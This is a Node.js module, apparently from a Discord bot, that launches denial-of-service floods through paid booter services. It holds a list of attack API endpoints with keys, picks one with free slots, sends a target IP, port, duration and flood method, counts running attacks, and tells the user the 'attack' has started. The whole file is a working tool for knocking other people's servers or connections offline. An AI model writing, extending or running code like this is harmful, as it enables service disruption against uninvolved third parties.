const axios = require('axios');
require('dotenv').config();
const { logSystemMessage, logActiveAttacks } = require('../utils/logger');

const apiDetails = [
    {
        name: 'Primary API',
        url: 'https://l7nexus.cc/v2/start',
        apiKey: process.env.PRIMARY_API_KEY,
        userId: process.env.PRIMARY_USER_ID,
        maxConcurrent: 4,
        activeAttacks: 0,
    },
    {
        name: 'Secondary API',
        url: process.env.SECONDARY_API_URL,
        apiKey: process.env.SECONDARY_API_KEY,
        userId: process.env.SECONDARY_USER_ID,
        maxConcurrent: 4,
        activeAttacks: 0,
    },
    {
        name: 'Dedicated Lag Bot',
        url: process.env.THIRD_API_URL,
        apiKey: process.env.THIRD_API_KEY,
        userId: process.env.THIRD_USER_ID,
        maxConcurrent: 3,
        activeAttacks: 0,
    },
    {
        name: 'Burst Lag API',
        url: process.env.BURST_API_URL,
        apiKey: process.env.BURST_API_KEY,
        userId: process.env.BURST_USER_ID,
        maxConcurrent: 2,
        activeAttacks: 0,
    }
];

const selectApi = () => {
    console.log('Selecting API...');
    for (const api of apiDetails) {
        console.log(`${api.name} active attacks: ${api.activeAttacks}/${api.maxConcurrent}`);
        if (api.activeAttacks < api.maxConcurrent) {
            console.log(`Selected ${api.name}`);
            return api;
        }
    }
    console.log('No available APIs');
    return null;
};

const sendRequest = async (interaction, client, ip, port, time) => {
    const api = selectApi();
    if (!api) {
        logSystemMessage(client, 'No available API slots');
        if (!interaction.replied) {
            await interaction.reply({ content: 'No available API slots. Please wait for an attack to complete.', ephemeral: true });
        } else {
            await interaction.followUp({ content: 'No available API slots. Please wait for an attack to complete.', ephemeral: true });
        }
        return;
    }

    try {
        logSystemMessage(client, `Sending request to ${ip}:${port} for ${time} seconds`);
        console.log(`Sending request to ${ip}:${port} for ${time} seconds`);

        // Increment active attacks
        api.activeAttacks += 1;

        const response = await axios.get(api.url, {
            params: {
                api_key: api.apiKey,
                user: api.userId,
                target: ip,
                time: time,
                port: port,
                method: 'overwatch',
            },
        });

        logSystemMessage(client, `API response received with status: ${response.status}`);
        console.log(`API response received with status: ${response.status}`);

        if (!interaction.replied) {
            await interaction.reply({ content: `Attack on ${ip}:${port} for ${time} seconds started successfully.`, ephemeral: true });
        } else {
            await interaction.followUp({ content: `Attack on ${ip}:${port} for ${time} seconds started successfully.`, ephemeral: true });
        }

        // Decrement active attacks after the duration
        setTimeout(() => {
            api.activeAttacks -= 1;
            logActiveAttacks(client, apiDetails);
        }, time * 1000); // Convert time from seconds to milliseconds
    } catch (error) {
        logSystemMessage(client, `Error making API request: ${error.message}`);
        console.log(`Error making API request: ${error.message}`);

        if (!interaction.replied) {
            await interaction.reply({ content: `Error making API request: ${error.message}`, ephemeral: true });
        } else {
            await interaction.followUp({ content: `Error making API request: ${error.message}`, ephemeral: true });
        }

        // Decrement active attacks in case of error
        api.activeAttacks -= 1;
        logActiveAttacks(client, apiDetails);
    }
};

module.exports = { selectApi, sendRequest, apiDetails };
